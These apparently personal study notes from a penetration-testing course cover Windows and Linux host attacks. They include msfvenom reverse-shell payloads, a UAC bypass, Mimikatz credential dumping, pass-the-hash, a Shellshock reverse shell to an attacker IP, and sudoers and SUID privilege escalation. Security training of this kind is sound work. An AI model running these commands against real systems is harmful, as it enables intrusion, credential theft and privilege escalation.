# Table of Contents
1. Overview
3. [Windows_Attacks](#Windows_attacks)
4. [Linux_Attacks](#Linux_Attacks)


---
# Overview
This phase is about exploiting what has been found in the [enumeration](../Assessment_Methodologies/Enumeration.md) phase.

Taking advantage of **inherent vulnerabilities** or **misconfigurations** in order to collect credentials and to expand your access and foothold into the network. All about gaining more power (privilege escalation) and expanding your access (lateral movement).
  
Host based attacks are against internal machines and not necessarily servers that are running services that are public accessible.

Type of Vulnerabilities
- Information Disclosure
- Buffer Overflows
- Remote Code Execution
- Privilege Escalation
- Denial of Service

---
# Windows_Attacks
### Services

| Service  | #Ports   | Description                            |
| -------- | -------- | -------------------------------------- |
| IIS      | 80/443   | webserver                              |
| WebDav   | 80/443   | Web Distributed Authoring & Versioning |
| SMB/CIFS | 445      | Network File sharing                   |
| RDP      | 3389     | Remote Desktop Protocol                |
| WinRM    | 5986/443 | Windows Remote Management Protocol     |

---
### Services
- [IIS WebDav](../../Services/IIS-WebDav.md)
- [SMB with PsExec](../../Services/SMB.md#PsExec)
- [RDP](../../Services/RDP.md)
- [WinRM](../../Services/WinRM.md)

---
### Privilege escalation
#### GitHub Tools
Iffy don't seem to be updated recently
- Windows-Exploit-Suggester
	- target patch level compared to MS vulnerability database
- SecWiki/Windows-Kernel-Exploits
	- Collection of exploits sorted by CVE

#### msfconsole
- post/multi/recon/local_exploit_suggester
	- set session
	- running will check for local exploits modules that appear possible
	- can then run module

#### UAC bypass Lab
- requires local admin account
- UACMe github /hfiref0x/UACME
	- `net localgroup administrators` : used to check user in local admin
	- *admin* account with *UAC* set on default setting
- rejetto msfconsole module
	- once on machine
	- `sysinfo` : shows info
	- `pgrep explorer` get PID
	- `migrate 2448` migrate to x64 via explorer PID
	- `sysinfo` verify
	- `getuid` show userinfo
	- `getprivs` shwo privileges
	- `shell` open local shell session
		- `net user` show users
		- `net localgroup administrators` show users in local administrator group
		- ctrl-c to exeit shell
	- `cd C:\\`
	- mkdir Temp if it doesnt exist
	- `upload /root/shells.exe` : from below
	- `upload /root/Desktop/tools/UACME/Akagi64.exe`
	- `shell` 
		- `.\Akagi64.exe 23 C:\Temp\shells.exe` 
- generate payload
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 \
LPORT=4455 -f exe > shells.exe
``` 

- msfconsole
	- use multi/handler
	- set payload windows/meterpreter/reverse_tcp
	- set LHOST
	- set LPORT 4455
	- run : sets up listener for payload
	- `ps` find lsass.exe with NT authority
	- `migrate 688` migrate to process
	- `getuid` show that you are NT authority
	- `hashdump` dump NTLM hashes

#### Access Token Impersonation
- Local Security Authority Subsystem Service (LSASS)
- Generated by **winlogin.exe**
- attached to **userinit.exe** which spawns all child processes by user
- Types of token
	- Impersonate-level : usefull on local system
	- Delegate-level : usefull on any system
- related privileges
	- SeAssignPrimaryToken : user to impersonate token
	- SeCreateToken : create an arbitrary token with administrative privilege
	- SeImpersonatePrivilege : spawn process under security context of token
###### msfconsole
- take advantage of rejetto to get meterpreter session
- `load incognito` to load extension
- `list_tokens -u` list out tokens
	- if tokens not found you can use potato attack
- `impersonate_token "name\Administrator"` copy token discovered above
- `pgrep explorer`
- `migrate 3421` migrate to PID from above
- once impersonating NT Authority look for loot

---
### Windows File System Vulnerabilities
Alternate Data Streams (ADS) is an NTFS file attribute. 
- Two Streams
	- Data Stream - file data
	- Resource stream - metadata
- can store malicious code in the resource stream of a legitimate file. This can be used to evade some basic anti-virus and static scanning.
`type payload.exe > windowslog.txt:winpeas.exe`
- normalData:resourceStream

---
### Windows Credential Dumping

Windows stores hashed user account passwords locally in the SAM (Security Accounts Manager) database. Authentication of credentials is facilitated by the Local Security authority (LSA). Earlier versions of windows use LM hashing. Vista and onwards uses NTLM Hashes.
- NTLM uses MD4
#### Windows Configuration Files
- can have hardcoded passwords in automation tools
- unattended windows setup utility
- xml file found under Windows Dir
	- C:\Windows\Panther\Unattend.xml
	- C:\Windows\Panther\Autounattend.xml
	- might be base64 encoded password
LAB
1. `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=4444 -f exe > payload.exe` : make payload
2. `python -m SimpleHTTPServer 80` : set up local server
3. `certutul -urlcache -f http://10.10.5.2/payload.exe payload.exe` : download payload from server
4. msfconsole : set up handler
	1. use multi/handler
	2. set payload windows/x64/meterpreter/reverse_tcp
	3. set LPORT 4444
	4. set LHOST ipaddr
	5. run : listen for callback from target
		1. search -f Unattend.xml
base64 -d password.txt
- `psexec.py Administrator@target`
	- password
	- shell access

---
#### MIMIKATZ
Extract passwords from running memory
Lab
1. need to get access, badblue
2. get meterpreter
3. `pgrep lsass` > `migrate` to PID
4. `load kiwi` : ? for help
5. `creds_all` grabs hashes
6. `lsa_dump_sam` grabs syskey and others hashes
Using mimikats
1. upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
2. shell
	1. `.\mimikatz.exe`
	2. `privilege::debug` check if you have privilege
	3. `lsadump::sam` dumps hashes
	4. `lsadump::secrets` 
	5. `sekurlsa::logonpasswords`  might show some cleartext

---

#### Pass-The-Hash
Metasploit PsExec module
1. get meterpreter access
	1. migrate to lasass
	2. load kiwi
	3. dump the Administrator hash
	4. hashdump to get lm hash, same for all users
2. search psexec for authenticated user
	1. set rhosts
	2. set lhosts 4445
	3. set smbuser administrator
	4. setpass HASH
	5. set target Native\ upload

---

#### crackmapexec
```bash
crackmapexec smb 10.2.34.3 -u Administrator -H "lm:ntlm" -x "ipconfig"
```
Use hash to connect over smb and run a command returning the output.
- `-u` : username
- `-H` : hash instead of password, usually just :ntlm
- `-x` : command to run

---
# Linux_Attacks

### Services

| Service | Port   | Description            |
| ------- | ------ | ---------------------- |
| Apache  | 80/443 | Apache Web Server      |
| SSH     | 22     | Secure Shell           |
| FTP     | 21     | File Transfer Protocol |
| SAMBA   | 445    | SMB implementation     |
### #FTP
- Login brute force 
- [FTP hydra](../../Services/FTP.md#hydra)
### #SSH
- login brute force
- [SSH](../../Services/SSH.md#hydra)
### #SAMBA 
- [SMB](../../Services/SMB.md)

---

## Vulnerabilities
### Shellshock
CVE-2014-6271
#### Apache via CGI script injection
- --script : check if vulnerable
	- http-shellshock --script-args http-shellshock.uri=/gettime.cgi
- burpsuite
	- useful with foxyproxy in firefox
	- send to repeater and replace user agent with the following
	- `() { :; }; echo; echo; /bin/bash -c ' cat /etc/shaddow'`
	- `() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/192.168.23.3/1234 0>&1'`
- netcat : set up listener
	- `nc -nvlp 1234`
##### msfconsole
- search shellshock
	- auxiliary says if vuln
	- exploit to take advantage
- use exploit/multi/http/apache_mod_cgi_bash_env_exec
	- set rhosts targetIP
	- set targeturi /gettime.cgi

---

## Privilege escalation
### Kernel Exploits
GitHub mzet/linux-exploit-suggester
1. get meterpreter session on host
2. upload Desktop/les.sh /temp/les.sh
3. ./les.sh
4. script lists important information and possible exploits
5. download exploit from ExploitDB
	1. upload to target then compile c code with gcc
	2. run code

### Cron Jobs
**LAB example**
This scenario message file exists in student user folder. Can use the following to search through files in the /usr dir to find the same path.
- -r : recursive
- -n : line number
- -w : match only whole word
```bash
grep -rnw /usr -e "home/student/message"
```
overwrite script found being called by cron
```bash
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```
`sudo -l` : check sudoers permissions
`/etc/init.d/cron reload` : force cron to reload and run
can use echo instead of printf

### SUID
**LAB Example**
Two binaries exist in home folder. one calls the other binary with SUID set for root. You can delete the called binary and replace it with bash and have it called. Can check this is being called by using strings on the welcome binary.
`rm greetings`
`cp /bin/bash greetings`
./welcome

### Dumping Hashes

| Value | Hashing Algorith |
| ----- | ---------------- |
| $1    | MD5              |
| $2    | Blowfish         |
| $5    | SHA-256          |
| $6    | SHA-512          |

**LAB Example**
1. Use msfconsole to exploit proftpd with the 133c backdoor. 
2. Get a cmd shell session by default then run /bin/bash -i to upgrade to rot bash. 
3. `ctrl-z` to send to background then `sessions`
4. `sessions -u 1` to try upgrading session to meterpreter
5. `sessions` to view that it was created
6. `sessions 2` swap to the new meterpreter session
7. hashdump module `search hashdump` "post/linux/gather/hashdump"
	1. set session 2
	2. run

